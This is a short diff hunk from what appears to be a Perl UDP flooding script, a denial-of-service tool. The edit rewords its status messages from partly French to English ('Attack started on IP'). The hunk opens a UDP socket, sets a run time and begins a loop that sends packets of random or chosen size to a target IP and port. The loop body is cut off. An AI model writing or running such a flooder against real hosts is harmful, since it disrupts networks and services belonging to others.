@@ -19,9 +19,9 @@ $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
  
-print "Flooding in progress $ip with the port " . ($port ? $port : "random") . ",send to" . 
+print "Attack started on IP: $ip & PORT: " . ($port ? $port : "random") . ",send to" . 
   ($size ? "$size-byte" : "random size") . " packets" . 
-  ($time ? " pour $time secondes" : "") . "\n";
+  ($time ? "  $time seconds" : "") . "\n";
 print "Stopped with Ctrl -C attack\n" unless $time;
  
 for (;time() <= $endtime;) {
